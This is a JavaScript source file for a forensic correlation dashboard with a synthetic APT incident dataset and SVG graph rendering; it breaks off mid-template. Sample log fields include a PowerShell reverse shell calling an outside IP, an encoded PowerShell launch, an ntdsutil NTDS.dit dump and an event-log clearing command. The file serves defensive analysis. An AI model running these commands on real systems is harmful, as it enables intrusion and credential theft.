/* ═══════════════════════════════════════════════════════════════
   THREAT STORM — EVIDENCECHAIN™ FORENSIC CORRELATION ENGINE
   Haute Cyber Intelligence Bureau • Deterministic Event Graph Engine
   ═══════════════════════════════════════════════════════════════ */

(function () {
    'use strict';

    // ═══════════════════════════════════════════════════════════
    // 1. DETERMINISTIC INVESTIGATION DATASET (INC-2026-8841)
    // ═══════════════════════════════════════════════════════════
    const DEFAULT_INVESTIGATION = {
        id: "INC-2026-8841",
        title: "SolarStorm APT: Multi-Stage Domain Controller Compromise & Egress",
        severity: "CRITICAL",
        cvss: 9.8,
        sector: "Financial Core Infrastructure",
        classification: "Synthetic Deterministic Sample Investigation (SOC Verification)",
        leadAnalyst: "Commander Yash K. (Haute Intelligence Bureau)",
        generatedAt: "2026-10-24T14:40:00Z",
        targetOrg: "Apex Global Custody & Clearing",
        telemetryWarnings: [
            {
                id: "WARN-01",
                severity: "warning",
                title: "Incomplete Workstation Sensor Buffer",
                message: "Workstation ws-fin-042 ring buffer dropped network packets between 14:18:02 and 14:21:45 UTC. Egress volume on Edge REL-04 is estimated from DC-side ingress flow only.",
                impactedNodes: ["EVT-105"],
                sensor: "EDR Network Packet Intercept"
            },
            {
                id: "WARN-02",
                severity: "warning",
                title: "Stale Domain Controller Event Telemetry",
                message: "Domain Controller dc-auth-prod-03 audit forwarding pipeline lag reached 12.4m during NTDS extraction. Raw security event EID 4662 arrived out-of-order.",
                impactedNodes: ["EVT-106"],
                sensor: "Active Directory Forwarding Agent"
            }
        ],
        events: [
            {
                id: "EVT-101",
                title: "Malicious Attachment Execution",
                stage: "Initial Access",
                mitre: "T1566.001",
                mitreName: "Spearphishing Attachment",
                timestamp: "2026-10-24 14:12:05 UTC",
                asset: "ws-fin-042.internal",
                user: "CORP\\m.reynolds",
                status: "confirmed", // confirmed | suspected | unverified | disputed
                severity: "high",
                telemetry: "EDR Process Telemetry (Sysmon EID 1)",
                process: "EXCEL.EXE (PID 8412) -> cmd.exe /c powershell.exe -enc...",
                telemetryHealth: "healthy",
                requiredEvidence: [
                    { name: "Parent Process Lineage (EXCEL.EXE)", status: "present", note: "Verified parent PID 8412, Session 1" },
                    { name: "Attachment SHA256 Hash", status: "present", note: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" },
                    { name: "Inbound Email Envelope Metadata", status: "present", note: "SMTP Message-ID: <202610241408.inv-891@q4-finance-notice.com>" },
                    { name: "User Kerberos Token Context", status: "present", note: "Ticket granting session valid for CORP\\m.reynolds" }
                ],
                rawSnippet: `EventID: 1 (ProcessCreate)
UtcTime: 2026-10-24 14:12:05.114
ProcessGuid: {D2A85F14-1205-671A-0000-0010E8124000}
ProcessId: 9104
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLi4u
ParentProcessId: 8412
ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE
User: CORP\\m.reynolds`,
                notes: "User clicked high-urgency macro document titled 'Q4_Executive_Wire_Schedule.xlsm'."
            },
            {
                id: "EVT-102",
                title: "In-Memory C2 Stager & Beaconing",
                stage: "Execution",
                mitre: "T1059.001",
                mitreName: "PowerShell ScriptBlock",
                timestamp: "2026-10-24 14:12:38 UTC",
                asset: "ws-fin-042.internal",
                user: "CORP\\m.reynolds",
                status: "confirmed",
                severity: "critical",
                telemetry: "PowerShell ScriptBlock Logging (EID 4104)",
                process: "powershell.exe (PID 9104)",
                telemetryHealth: "healthy",
                requiredEvidence: [
                    { name: "Deobfuscated ScriptBlock AST", status: "present", note: "AMSI buffer reconstructed payload successfully" },
                    { name: "Socket Connection to External IP", status: "present", note: "TCP 185.220.101.44:443 (ESTABLISHED)" },
                    { name: "Threat Intel Blacklist Signature", status: "present", note: "Matched APT-Vanguard Command Server Cluster" }
                ],
                rawSnippet: `EventID: 4104 (ScriptBlockLogging)
ScriptBlockText:
$wc = New-Object System.Net.Sockets.TcpClient("185.220.101.44", 443);
$stream = $wc.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
}`,
                notes: "Reverse shell established direct beaconing every 60s with randomized 15% jitter."
            },
            {
                id: "EVT-103",
                title: "Scheduled Task Persistence Staging",
                stage: "Persistence",
                mitre: "T1053.005",
                mitreName: "Scheduled Task / Job",
                timestamp: "2026-10-24 14:15:12 UTC",
                asset: "ws-fin-042.internal",
                user: "CORP\\SYSTEM",
                status: "suspected",
                severity: "medium",
                telemetry: "TaskScheduler Operational (EID 106)",
                process: "schtasks.exe /create /tn 'OneDriveHealthSync' /tr 'rundll32.exe...'",
                telemetryHealth: "healthy",
                requiredEvidence: [
                    { name: "Task XML Definition", status: "present", note: "Task scheduled to trigger at every workstation boot" },
                    { name: "Target Binary Executable Path", status: "present", note: "C:\\ProgramData\\OneDrive\\sync_helper.dll" },
                    { name: "Registry Run Key Mirror", status: "missing", note: "Registry monitor did not detect expected mirror key" }
                ],
                rawSnippet: `EventID: 106 (TaskRegistered)
TaskName: \\OneDriveHealthSync
UserContext: NT AUTHORITY\\SYSTEM
Action: rundll32.exe C:\\ProgramData\\OneDrive\\sync_helper.dll,DllRegisterServer
Trigger: AtLogon / Every 4 Hours`,
                notes: "Masquerading as Microsoft OneDrive internal sync worker."
            },
            {
                id: "EVT-104",
                title: "LSASS Memory Dump & Injection",
                stage: "Credential Access",
                mitre: "T1003.001",
                mitreName: "LSASS Memory Access",
                timestamp: "2026-10-24 14:17:40 UTC",
                asset: "ws-fin-042.internal",
                user: "NT AUTHORITY\\SYSTEM",
                status: "confirmed",
                severity: "critical",
                telemetry: "Sysmon Process Access (EID 10)",
                process: "rundll32.exe (PID 10244) -> lsass.exe (PID 620)",
                telemetryHealth: "healthy",
                requiredEvidence: [
                    { name: "GrantedAccess Mask (0x1010)", status: "present", note: "PROCESS_VM_READ | PROCESS_QUERY_INFORMATION" },
                    { name: "Call Trace Memory Stack", status: "present", note: "dbgcore.dll!MiniDumpWriteDump -> ntdll.dll!NtReadVirtualMemory" },
                    { name: "Target LSASS PID Verification", status: "present", note: "PID 620 verified authoritative Local Security Authority" },
                    { name: "Extracted Ticket Artifact Dump", status: "present", note: "Recovered TGT hash for service account svc-backup-admin" }
                ],
                rawSnippet: `EventID: 10 (ProcessAccess)
SourceImage: C:\\Windows\\System32\\rundll32.exe
SourceProcessId: 10244
TargetImage: C:\\Windows\\System32\\lsass.exe
TargetProcessId: 620
GrantedAccess: 0x1010
CallTrace: C:\\Windows\\System32\\dbgcore.dll+0x31a2|C:\\Windows\\System32\\KERNELBASE.dll+0x18b20`,
                notes: "Memory dump harvested active Kerberos tickets for high-privilege domain service accounts."
            },
            {
                id: "EVT-105",
                title: "Remote Service Lateral Pivot via SMB",
                stage: "Lateral Movement",
                mitre: "T1021.002",
                mitreName: "SMB/Windows Admin Shares",
                timestamp: "2026-10-24 14:19:55 UTC",
                asset: "dc-auth-prod-03.internal",
                user: "CORP\\svc-backup-admin",
                status: "unverified",
                severity: "critical",
                telemetry: "Windows Security EID 7045 & NetFlow",
                process: "services.exe -> PSEXESVC.exe (PID 4481)",
                telemetryHealth: "warning",
                requiredEvidence: [
                    { name: "Source Workstation RPC Egress PCAP", status: "missing", note: "Missing due to ws-fin-042 sensor ring buffer drop" },
                    { name: "Target DC Service Install Event (EID 7045)", status: "present", note: "Service 'PSEXESVC' installed on Domain Controller" },
                    { name: "Service Account Auth Ticket (#88491)", status: "present", note: "Kerberos TGS request matched ticket dumped in EVT-104" }
                ],
                rawSnippet: `EventID: 7045 (ServiceInstalled)
ServiceName: PSEXESVC
ImagePath: %SystemRoot%\\PSEXESVC.exe
ServiceType: user mode service
StartType: demand start
AccountName: LocalSystem
ClientAddress: 10.14.8.42 (ws-fin-042)`,
                notes: "⚠️ UNVERIFIED CAUSALITY: Missing source PCAP packets. Correlation established via target DC Kerberos log and client IP."
            },
            {
                id: "EVT-106",
                title: "Volume Shadow Copy & NTDS.dit Extraction",
                stage: "Collection",
                mitre: "T1003.003",
                mitreName: "NTDS Database Shadow Extraction",
                timestamp: "2026-10-24 14:24:10 UTC",
                asset: "dc-auth-prod-03.internal",
                user: "CORP\\svc-backup-admin",
                status: "suspected",
                severity: "critical",
                telemetry: "VSS Operational Audit & Command Line",
                process: "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\\Windows\\Temp\\ntds_bk' q q",
                telemetryHealth: "warning",
                requiredEvidence: [
                    { name: "ntdsutil Process Command Parameters", status: "present", note: "Full IFM creation switch identified" },
                    { name: "Temporary Dump Directory File Handle", status: "present", note: "Created C:\\Windows\\Temp\\ntds_bk\\Active Directory\\ntds.dit" },
                    { name: "VSS Volume Shadow Snapshot ID", status: "missing", note: "Stale DC agent failed to capture snapshot UUID" }
                ],
                rawSnippet: `EventID: 4688 (ProcessCreation)
SubjectUserName: svc-backup-admin
NewProcessName: C:\\Windows\\System32\\ntdsutil.exe
CommandLine: ntdsutil.exe "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\ntds_bk" q q
ParentProcessName: C:\\Windows\\PSEXESVC.exe`,
                notes: "Attempted full Active Directory credential database snapshot creation for offline cracking."
            },
            {
                id: "EVT-107",
                title: "Encrypted C2 Tunnel Exfiltration",
                stage: "Exfiltration",
                mitre: "T1048.003",
                mitreName: "Exfiltration Over Encrypted Non-C2 Protocol",
                timestamp: "2026-10-24 14:31:02 UTC",
                asset: "dc-auth-prod-03.internal",
                user: "CORP\\svc-backup-admin",
                status: "confirmed",
                severity: "critical",
                telemetry: "Perimeter Deep Packet Inspection & Zeek SSL",
                process: "svchost.exe (Injected Reverse SOCKS Tunnel)",
                telemetryHealth: "healthy",
                requiredEvidence: [
                    { name: "Encrypted Egress Volume Record (2.34 MB)", status: "present", note: "High entropy byte distribution matching AES archive" },
                    { name: "Target IP Reputational Feed Hit", status: "present", note: "185.220.101.44 flagged by 6 commercial threat feeds" },
                    { name: "TLS JA3/JA3S Fingerprint Match", status: "present", note: "JA3: 72c589329862cd402c75a13a7234807e (CobaltStrike/Metasploit)" }
                ],
                rawSnippet: `Zeek conn.log / ssl.log
ts: 2026-10-24 14:31:02.894
uid: C6T11a3J89vN1z2k98
id.orig_h: 10.14.2.10 (dc-auth-prod-03)
id.orig_p: 49812
id.resp_h: 185.220.101.44
id.resp_p: 443
proto: tcp
orig_bytes: 2453670
resp_bytes: 14210
conn_state: SF
ja3: 72c589329862cd402c75a13a7234807e
server_name: c2-telemetry-gateway.securecloud-routing.net`,
                notes: "Exfiltration completed over outbound port 443. Target domain controller isolated via perimeter null-route."
            },
            {
                id: "EVT-108",
                title: "Security Event Log Clear Attempt",
                stage: "Defense Evasion",
                mitre: "T1070.001",
                mitreName: "Clear Windows Event Logs",
                timestamp: "2026-10-24 14:33:15 UTC",
                asset: "ws-fin-042.internal",
                user: "CORP\\m.reynolds",
                status: "disputed",
                severity: "high",
                telemetry: "SIEM Audit Engine Flag",
                process: "wevtutil.exe cl Security",
                telemetryHealth: "warning",
                requiredEvidence: [
                    { name: "Wevtutil Command Trigger Record", status: "present", note: "Command executed via maintenance task" },
                    { name: "Windows EventID 1102 (Log Cleared)", status: "disputed", note: "SIEM mirror shows events were NOT dropped; was scheduled retention rotation" },
                    { name: "Threat Actor User SID Binding", status: "disputed", note: "Initiator was local SYSTEM scheduled clean-up script, not C2 thread" }
                ],
                rawSnippet: `EventID: 1102 (The audit log was cleared)
Subject: NT AUTHORITY\\SYSTEM
Channel: Security
Note: SIEM Cross-Check flagged script 'C:\\IT\\Scripts\\weekly_event_rotate.ps1'`,
                notes: "DISPUTED EVENT: Analyst investigation confirmed this was automated weekly IT maintenance, not threat actor anti-forensics."
            }
        ],
        relationships: [
            {
                id: "REL-01",
                source: "EVT-101",
                target: "EVT-102",
                label: "Spawns Stager",
                ruleId: "CR-101",
                ruleName: "Direct Parent-Child Process Hierarchy",
                confidence: 98,
                verification: "verified", // verified | probabilistic | unverified | disputed
                timeDelta: "+33s",
                explanation: "Event EVT-101 (EXCEL.EXE execution) directly spawned process PID 9104 (powershell.exe). Process token and logon session ID match exactly (Session ID: 0x2A19F). Explicit causality confirmed by OS kernel hooks.",
                artifacts: [
                    "ParentProcessGuid matches ChildProcessGuid parent link",
                    "Session Token 0x2A19F identical across boundary",
                    "AMSI buffer triggered within 1.2 seconds of process creation"
                ]
            },
            {
                id: "REL-02",
                source: "EVT-102",
                target: "EVT-103",
                label: "Drops Persistence",
                ruleId: "CR-102",
                ruleName: "Temporal Proximity & Elevated Session Privilege",
                confidence: 91,
                verification: "verified",
                timeDelta: "+2m 34s",
                explanation: "Within 2.5 minutes of C2 beacon establishment, a persistent scheduled task was staged using the same token privilege elevation vector. File handle creation matches C2 temp path.",
                artifacts: [
                    "File handle to sync_helper.dll opened by PowerShell PID 9104",
                    "Task trigger parameters match adversary payload layout"
                ]
            },
            {
                id: "REL-03",
                source: "EVT-102",
                target: "EVT-104",
                label: "Injects LSASS",
                ruleId: "CR-104",
                ruleName: "Inter-Process Memory Handle Injection",
                confidence: 95,
                verification: "verified",
                timeDelta: "+5m 02s",
                explanation: "The C2 worker thread spawned helper rundll32.exe (PID 10244) which immediately invoked OpenProcess with PROCESS_VM_READ permissions targeting lsass.exe (PID 620). Stack trace demonstrates deterministic injection call.",
                artifacts: [
                    "OpenProcess API Call GrantedAccess 0x1010",
                    "Memory dump mini-dump buffer written to \\Device\\HarddiskVolume3",
                    "Kerberos TGT ticket recovered in adversary memory cache"
                ]
            },
            {
                id: "REL-04",
                source: "EVT-104",
                target: "EVT-105",
                label: "Lateral Ticket Replay",
                ruleId: "CR-105",
                ruleName: "Kerberos Ticket Pass-the-Hash / Replay Correlation",
                confidence: 74,
                verification: "unverified",
                timeDelta: "+2m 15s",
                explanation: "TGT ticket for account 'svc-backup-admin' dumped from LSASS in EVT-104 was presented to Domain Controller dc-auth-prod-03 2m 15s later to install PSEXESVC. However, missing WS-042 egress PCAP makes direct causality unverified.",
                artifacts: [
                    "Kerberos Ticket ID #88491 matched across memory and network auth",
                    "Source IP 10.14.8.42 matched infected workstation",
                    "Missing: Direct PCAP packets showing RPC call transmission"
                ]
            },
            {
                id: "REL-05",
                source: "EVT-105",
                target: "EVT-106",
                label: "Executes NTDS Dump",
                ruleId: "CR-106",
                ruleName: "Remote Execution Session Command Propagation",
                confidence: 89,
                verification: "verified",
                timeDelta: "+4m 15s",
                explanation: "Active remote shell session initiated on Domain Controller via PSEXESVC (PID 4481) directly launched ntdsutil.exe with full IFM creation arguments under the identical elevated service account SID.",
                artifacts: [
                    "Parent PID 4481 matches PSEXESVC daemon",
                    "Target dump directory C:\\Windows\\Temp\\ntds_bk created in same process tree",
                    "Security audit log EID 4688 confirms execution context"
                ]
            },
            {
                id: "REL-06",
                source: "EVT-106",
                target: "EVT-107",
                label: "Stages & Exfiltrates",
                ruleId: "CR-107",
                ruleName: "Staged Archive Egress Temporal Pipeline",
                confidence: 92,
                verification: "verified",
                timeDelta: "+6m 52s",
                explanation: "Completion of NTDS database shadow copy extraction was followed within 6m 52s by high-throughput encrypted egress of 2.34 MB to known threat actor IP 185.220.101.44. Byte volume closely matches compressed ntds.dit archive.",
                artifacts: [
                    "NetFlow session timestamp immediately subsequent to file close",
                    "Egress destination IP 185.220.101.44 identical to Initial C2 in EVT-102",
                    "Encrypted protocol fingerprint JA3 confirms known adversary tooling"
                ]
            },
            {
                id: "REL-07",
                source: "EVT-103",
                target: "EVT-108",
                label: "Defense Evasion Link",
                ruleId: "CR-108",
                ruleName: "Post-Exploitation Anti-Forensics Heuristic",
                confidence: 34,
                verification: "disputed",
                timeDelta: "+18m 03s",
                explanation: "Initial automated correlation flagged log clearing as attacker anti-forensics following persistence setup. Analyst review proved Event EVT-108 was normal scheduled IT maintenance and not connected to adversary activity.",
                artifacts: [
                    "Disputed correlation: Independent scheduled task executed by LocalSystem",
                    "No correlation with C2 thread memory space"
                ]
            }
        ],
        auditTrail: [
            { time: "14:40:12", text: "Automated EvidenceChain graph constructed from 8 correlated events across 3 telemetry pipelines." },
            { time: "14:42:30", text: "Analyst YK reviewed EVT-108 and marked status as DISPUTED (Routine IT Maintenance)." },
            { time: "14:44:05", text: "Correlation Engine flagged telemetry warning WARN-01: missing PCAP on Workstation-042." }
        ]
    };

    // ═══════════════════════════════════════════════════════════
    // 2. STATE CONTROLLER
    // ═══════════════════════════════════════════════════════════
    let investigation = JSON.parse(JSON.stringify(DEFAULT_INVESTIGATION));
    let selectedEventId = "EVT-104"; // Default selected event
    let selectedRelationshipId = null;
    let activeInspectorTab = "event"; // "event" | "evidence" | "correction"
    let searchQuery = "";
    let statusFilter = "all";
    let transform = { x: 20, y: 15, k: 0.96 };
    let isPanning = false;
    let panStart = { x: 0, y: 0 };

    // Node Positions (Ergonomic High-Tech Cyber Kill Chain Layout)
    const NODE_POSITIONS = {
        "EVT-101": { x: 135, y: 175 }, // Phase I: Initial Access
        "EVT-102": { x: 385, y: 175 }, // Phase II: Execution & Stager
        "EVT-103": { x: 385, y: 415 }, // Phase II Branch: Persistence Staging
        "EVT-104": { x: 635, y: 175 }, // Phase III: Credential Harvesting
        "EVT-108": { x: 635, y: 415 }, // Phase III Branch: Defense Evasion
        "EVT-105": { x: 885, y: 175 }, // Phase IV: Lateral Pivot
        "EVT-106": { x: 1135, y: 175 }, // Phase V: Collection & Staging
        "EVT-107": { x: 1385, y: 175 }  // Phase VI: Exfiltration & Egress
    };

    // ═══════════════════════════════════════════════════════════
    // 3. COMPUTATION ENGINES (COMPLETENESS & RE-EVALUATION)
    // ═══════════════════════════════════════════════════════════

    function calculateEvidenceCompleteness() {
        let totalItems = 0;
        let presentItems = 0;

        investigation.events.forEach(evt => {
            if (evt.status === "disputed") return; // exclude disputed events from required chain
            evt.requiredEvidence.forEach(item => {
                totalItems++;
                if (item.status === "present") presentItems++;
            });
        });

        const percent = totalItems > 0 ? Math.round((presentItems / totalItems) * 100) : 0;
        return {
            percent,
            present: presentItems,
            total: totalItems
        };
    }

    function reevaluateEvidenceChain() {
        // Deterministically recompute relationship confidences based on node statuses
        investigation.relationships.forEach(rel => {
            const src = investigation.events.find(e => e.id === rel.source);
            const tgt = investigation.events.find(e => e.id === rel.target);
            if (!src || !tgt) return;

            let baseConfidence = 90;

            // If either node is disputed, relationship confidence collapses
            if (src.status === "disputed" || tgt.status === "disputed") {
                rel.confidence = 22;
                rel.verification = "disputed";
                rel.explanation = `BROKEN EVIDENCE LINK: Node ${src.status === "disputed" ? src.id : tgt.id} has been DISPUTED by analyst review. Dependent correlation path is invalid.`;
                return;
            }

            // Adjust based on node verification statuses
            if (src.status === "unverified" || tgt.status === "unverified") {
                baseConfidence -= 25;
                rel.verification = "unverified";
            } else if (src.status === "suspected" || tgt.status === "suspected") {
                baseConfidence -= 10;
                rel.verification = "probabilistic";
            } else {
                rel.verification = "verified";
            }

            // Check evidence completeness of source and target
            const srcMissing = src.requiredEvidence.filter(i => i.status === "missing").length;
            const tgtMissing = tgt.requiredEvidence.filter(i => i.status === "missing").length;
            baseConfidence -= (srcMissing * 4 + tgtMissing * 4);

            rel.confidence = Math.max(15, Math.min(99, baseConfidence));
        });

        // Add audit trail entry
        const now = new Date().toTimeString().split(' ')[0];
        investigation.auditTrail.unshift({
            time: now,
            text: `Analyst re-evaluated correlation matrix. Evidence completeness updated to ${calculateEvidenceCompleteness().percent}%.`
        });

        // Re-render
        renderCompletenessBar();
        renderGraph();
        renderInspector();
        renderAuditTrail();
    }

    // ═══════════════════════════════════════════════════════════
    // 4. GRAPH RENDERING & HIGHLIGHTING
    // ═══════════════════════════════════════════════════════════

    function getConnectedEntities(nodeId) {
        const connectedNodes = new Set([nodeId]);
        const connectedEdges = new Set();

        investigation.relationships.forEach(rel => {
            if (rel.source === nodeId || rel.target === nodeId) {
                connectedEdges.add(rel.id);
                connectedNodes.add(rel.source);
                connectedNodes.add(rel.target);
            }
        });

        return { connectedNodes, connectedEdges };
    }

    function renderGraph() {
        const svg = document.getElementById('ev-graph-svg');
        if (!svg) return;

        // Determine highlighting
        let activeNodes = null;
        let activeEdges = null;

        if (selectedEventId) {
            const res = getConnectedEntities(selectedEventId);
            activeNodes = res.connectedNodes;
            activeEdges = res.connectedEdges;
        } else if (selectedRelationshipId) {
            const rel = investigation.relationships.find(r => r.id === selectedRelationshipId);
            if (rel) {
                activeNodes = new Set([rel.source, rel.target]);
                activeEdges = new Set([rel.id]);
            }
        }

        // Filtering by search query & status
        const filteredEvents = investigation.events.filter(e => {
            if (statusFilter !== "all" && e.status !== statusFilter) return false;
            if (searchQuery) {
                const q = searchQuery.toLowerCase();
                const match = e.id.toLowerCase().includes(q) ||
                              e.title.toLowerCase().includes(q) ||
                              e.mitre.toLowerCase().includes(q) ||
                              e.asset.toLowerCase().includes(q) ||
                              e.process.toLowerCase().includes(q);
                if (!match) return false;
            }
            return true;
        });
        const filteredNodeIds = new Set(filteredEvents.map(e => e.id));

        const STAGE_ICONS = {
            "EVT-101": "📧",
            "EVT-102": "⚡",
            "EVT-103": "⏰",
            "EVT-104": "🔑",
            "EVT-105": "🔄",
            "EVT-106": "💾",
            "EVT-107": "🌐",
            "EVT-108": "🛡️"
        };

        const STAGE_COLUMNS = [
            { num: "PHASE I", title: "INITIAL ACCESS", x: 20, cx: 135 },
            { num: "PHASE II", title: "EXECUTION & C2", x: 270, cx: 385 },
            { num: "PHASE III", title: "CREDENTIAL ACCESS", x: 520, cx: 635 },
            { num: "PHASE IV", title: "LATERAL PIVOT", x: 770, cx: 885 },
            { num: "PHASE V", title: "COLLECTION & STAGE", x: 1020, cx: 1135 },
            { num: "PHASE VI", title: "EXFILTRATION", x: 1270, cx: 1385 }
        ];

        // Build SVG content inside a pan-zoom group
        let html = `
            <defs>
                <filter id="ev-glow" x="-20%" y="-20%" width="140%" height="140%">
                    <feGaussianBlur stdDeviation="3.5" result="blur"/>
                    <feComposite in="SourceGraphic" in2="blur" operator="over"/>
                </filter>
                <filter id="ev-shadow" x="-10%" y="-10%" width="120%" height="120%">
                    <feDropShadow dx="0" dy="4" stdDeviation="6" flood-color="#000000" flood-opacity="0.8"/>
                </filter>
                <linearGradient id="ev-node-grad" x1="0" y1="0" x2="0" y2="1">
                    <stop offset="0%" stop-color="#0d182e"/>
                    <stop offset="100%" stop-color="#050813"/>
                </linearGradient>
                <linearGradient id="ev-node-grad-active" x1="0" y1="0" x2="0" y2="1">
                    <stop offset="0%" stop-color="#142647"/>
                    <stop offset="100%" stop-color="#070c1a"/>
                </linearGradient>
                <marker id="ev-arrow" viewBox="0 0 10 10" refX="24" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
                    <path d="M 0 1.5 L 8 5 L 0 8.5 z" fill="#38bdf8"/>
                </marker>
                <marker id="ev-arrow-gold" viewBox="0 0 10 10" refX="24" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
                    <path d="M 0 1 L 9 5 L 0 9 z" fill="#d4af37"/>
                </marker>
                <marker id="ev-arrow-disputed" viewBox="0 0 10 10" refX="24" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
                    <path d="M 0 1.5 L 8 5 L 0 8.5 z" fill="#ff2d55"/>
                </marker>
            </defs>
            <g transform="translate(${transform.x}, ${transform.y}) scale(${transform.k})" id="ev-graph-root">

                <!-- Tactical Grid Background & Range Rings -->
                <g class="ev-grid-lines" opacity="0.15">
                    ${Array.from({ length: 18 }).map((_, i) => `<line x1="${i * 90}" y1="0" x2="${i * 90}" y2="560" stroke="#38bdf8" stroke-dasharray="2 5"/>`).join('')}
                    ${Array.from({ length: 8 }).map((_, i) => `<line x1="0" y1="${i * 80}" x2="1540" y2="${i * 80}" stroke="#38bdf8" stroke-dasharray="2 5"/>`).join('')}
                    <circle cx="770" cy="280" r="380" fill="none" stroke="#38bdf8" stroke-width="0.7" stroke-dasharray="3 7"/>
                    <circle cx="770" cy="280" r="220" fill="none" stroke="#d4af37" stroke-width="0.6" stroke-dasharray="4 8"/>
                </g>

                <!-- High-Tech Glassmorphic Vertical Stage Columns -->
                <g class="ev-stage-columns-layer">
                    ${STAGE_COLUMNS.map(col => `
                        <g class="ev-stage-col-group">
                            <rect x="${col.x}" y="20" width="230" height="520" rx="14"
                                  fill="rgba(6, 10, 22, 0.45)" stroke="rgba(30, 58, 105, 0.35)" stroke-width="1.2"/>
                            <rect x="${col.x}" y="20" width="230" height="55" rx="14"
                                  fill="rgba(10, 16, 32, 0.65)" stroke="none"/>
                            <line x1="${col.x + 25}" y1="20" x2="${col.x + 205}" y2="20"
                                  stroke="rgba(212, 175, 55, 0.65)" stroke-width="2"/>
                            <text x="${col.cx}" y="42" text-anchor="middle" font-family="JetBrains Mono" font-size="8.5" font-weight="700" fill="var(--gold-bright)" letter-spacing="0.14em">
                                ${col.num}
                            </text>
                            <text x="${col.cx}" y="58" text-anchor="middle" font-family="Cinzel" font-size="9.5" font-weight="700" fill="#f0f4fa" letter-spacing="0.08em">
                                ${col.title}
                            </text>
                            <line x1="${col.x + 40}" y1="67" x2="${col.x + 190}" y2="67"
                                  stroke="rgba(56, 189, 248, 0.2)" stroke-width="0.8" stroke-dasharray="2 3"/>
                        </g>
                    `).join('')}
                </g>

                <!-- Corner Tactical Reticles -->
                <g class="ev-corner-reticles" stroke="rgba(212, 175, 55, 0.5)" stroke-width="1.5" fill="none">
                    <path d="M 12 30 L 12 12 L 30 12"/>
                    <path d="M 1528 30 L 1528 12 L 1510 12"/>
                    <path d="M 12 525 L 12 543 L 30 543"/>
                    <path d="M 1528 525 L 1528 543 L 1510 543"/>
                    <text x="22" y="556" font-family="JetBrains Mono" font-size="8.5" fill="rgba(144, 160, 184, 0.45)" stroke="none">
                        [SYS_GRID // TELEMETRY GRID 8841.04 // SECTOR: FINANCIAL CORE // APT-VANGUARD]
                    </text>
                </g>

                <!-- Edges Layer (Animated Luminous Conduits) -->
                <g class="ev-edges-layer">
        `;

        investigation.relationships.forEach(rel => {
            const p1 = NODE_POSITIONS[rel.source];
            const p2 = NODE_POSITIONS[rel.target];
            if (!p1 || !p2) return;

            // If either node is filtered out, skip
            if (!filteredNodeIds.has(rel.source) || !filteredNodeIds.has(rel.target)) return;

            const isSelected = selectedRelationshipId === rel.id;
            const isHighlighted = activeEdges && activeEdges.has(rel.id);
            const isDimmed = activeEdges && !activeEdges.has(rel.id);

            let marker = "url(#ev-arrow)";
            if (isSelected) marker = "url(#ev-arrow-gold)";
            if (rel.verification === "disputed") marker = "url(#ev-arrow-disputed)";

            // Node width 186, height 94 (generous 64px clearance between columns)
            let startX, startY, endX, endY, cx, cy;
            if (p1.y === p2.y) {
                // Horizontal direct kill-chain flow
                startX = p1.x + 93;
                startY = p1.y;
                endX = p2.x - 93;
                endY = p2.y;
                cx = (startX + endX) / 2;
                cy = startY - 26; // Arched upward to clear card bodies
            } else if (p1.x === p2.x) {
                // Vertical downward branch (EVT-102 -> EVT-103)
                startX = p1.x;
                startY = p1.y + 47;
                endX = p2.x;
                endY = p2.y - 47;
                cx = startX + 36;
                cy = (startY + endY) / 2;
            } else {
                // Diagonal branch (EVT-103 -> EVT-108)
                startX = p1.x + 93;
                startY = p1.y;
                endX = p2.x - 93;
                endY = p2.y;
                cx = (startX + endX) / 2;
                cy = 476; // Arched below card bottoms (bottom is 462)
            }

            const pathD = `M ${startX} ${startY} Q ${cx} ${cy} ${endX} ${endY}`;

            let edgeClasses = "ev-edge-path";
            if (isSelected) edgeClasses += " ev-edge--selected";
            if (isHighlighted) edgeClasses += " ev-edge--highlighted";
            if (isDimmed) edgeClasses += " ev-edge--dimmed";
            if (rel.verification === "disputed") edgeClasses += " ev-edge--disputed";

            const conduitColor = isSelected ? '#d4af37' : (rel.verification === 'disputed' ? '#ff2d55' : (isHighlighted ? '#38bdf8' : 'rgba(56, 189, 248, 0.45)'));
            const pulseColor = isSelected ? '#f3d47c' : (rel.verification === 'disputed' ? '#ff2d55' : '#38bdf8');
            const defaultBadgeStroke = rel.verification === 'disputed' ? '#ff2d55' : 'rgba(56, 189, 248, 0.45)';

            html += `
                <!-- Outer Soft Glow Conduit -->
                <path d="${pathD}" stroke="${conduitColor}" stroke-width="${isSelected ? 6 : 3.5}" opacity="${isDimmed ? 0.08 : 0.22}" fill="none"/>

                <!-- Core Laser Conduit Wire -->
                <path id="path-${rel.id}" d="${pathD}" class="${edgeClasses}" data-rel-id="${rel.id}" data-verification="${rel.verification}" marker-end="${marker}"/>

                <!-- Animated Data Packet Pulse Traveling Along Conduit -->
                ${!isDimmed ? `
                    <circle r="3.5" fill="${pulseColor}" filter="url(#ev-glow)">
                        <animateMotion dur="${isSelected ? '1.8s' : '2.8s'}" repeatCount="indefinite" path="${pathD}"/>
                    </circle>
                ` : ''}

                <!-- Edge Correlation Rule Badge (Clearance-Protected) -->
                <g class="ev-edge-label-group ${isSelected ? 'ev-edge-label--selected' : ''}" data-rel-id="${rel.id}" data-default-stroke="${defaultBadgeStroke}" transform="translate(${cx}, ${cy})">
                    <rect x="-28" y="-10" width="56" height="20" rx="5"
                          fill="#060913" stroke="${isSelected ? 'var(--gold)' : defaultBadgeStroke}"
                          stroke-width="${isSelected ? 1.8 : 1}" filter="url(#ev-shadow)"/>
                    <text x="0" y="3.5" text-anchor="middle" font-family="JetBrains Mono" font-size="8.5" font-weight="700" fill="${isSelected ? '#f3d47c' : '#38bdf8'}">
                        ${rel.ruleId}
                    </text>
                </g>
